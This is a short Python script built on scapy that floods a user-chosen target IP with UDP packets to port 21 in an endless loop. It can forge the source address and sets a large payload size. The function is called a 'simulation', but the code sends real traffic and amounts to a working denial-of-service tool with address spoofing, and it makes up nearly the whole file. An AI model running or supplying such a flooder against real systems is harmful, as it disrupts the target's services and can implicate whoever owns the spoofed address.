import scapy.all as scp

ip_src = input("Fake Source IP (blank for your IP): ")
ip_dst = input("Target IP: ")

pkg_size = input("packet Size (blank for max): ")


def dos_simulation(ip_src, ip_dst, pkg_size):
    if not (pkg_size):
        pkg_size = 65000

    ip_layer = scp.IP(dst=ip_dst)
    if ip_src:
        ip_layer = scp.IP(src=ip_src, dst=ip_dst)

    udp_layer = scp.UDP(sport=80, dport=21)
    raw_layer = scp.Raw(int(pkg_size))

    packet = ip_layer / udp_layer / raw_layer

    scp.send(packet, loop=1)
    print(packet)


dos_simulation(ip_src, ip_dst, pkg_size)
